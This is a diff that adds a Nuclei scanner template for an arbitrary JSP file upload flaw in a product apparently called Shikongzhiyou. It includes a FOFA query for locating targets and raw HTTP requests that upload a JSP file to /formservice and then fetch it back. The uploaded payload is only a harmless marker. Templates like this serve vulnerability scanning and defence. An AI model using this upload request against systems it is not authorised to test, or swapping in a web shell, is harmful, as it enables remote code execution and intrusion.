@@ -1,0 +1,42 @@
+id: shikongzhiyou-upload
+info:
+  name: shikongzhiyou-upload
+  author: sb
+  severity: critical
+  tags: upload
+  description: 文件上传
+  metadata:
+    fofa-query: icon_hash="-1700598274"
+
+http:
+  - raw:
+      - |
+        POST /formservice?service=attachment.write&isattach=false&filename=top.jsp HTTP/1.1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip
+
+        <%= "nuclei" %>
+      - |
+        GET /form/temp/{{filename}} HTTP/1.1
+        
+        
+    extractors: 
+      - type: regex
+        name: filename
+        part: body
+        group: 1
+        internal: true
+        regex: 
+          - 'root>(.*?)<' 
+    req-condition: true    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - "nuclei"      
+
+      - type: status
+        part: body_2
+        status:
+          - 200
